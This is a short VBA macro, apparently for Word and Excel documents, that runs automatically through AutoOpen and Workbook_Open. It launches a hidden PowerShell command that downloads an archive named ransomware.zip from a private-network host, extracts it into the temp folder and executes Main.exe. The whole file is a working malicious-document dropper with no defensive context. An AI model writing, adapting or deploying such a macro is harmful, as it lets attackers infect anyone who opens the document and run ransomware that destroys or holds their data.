Sub macro_powershell()

    'Create a shell to call powershell commands
    Dim powershellCommands
    powershellCommands = Shell("powershell Invoke-WebRequest -Uri http://192.168.85.128/ransomware.zip -OutFile $Env:temp\ransomware.zip ; Expand-Archive $Env:temp\ransomware.zip -dest $Env:temp\ -force ; cd $Env:temp\ransomware\ ; .\Main.exe ; exit", 0)

End Sub

'Add compatibility for PowerPoint and Excel,
'Using the AutoOpen() and Workbook_Open() functions

Sub AutoOpen()
    macro_powershell
End Sub

Sub Workbook_Open()
    macro_powershell
End Sub
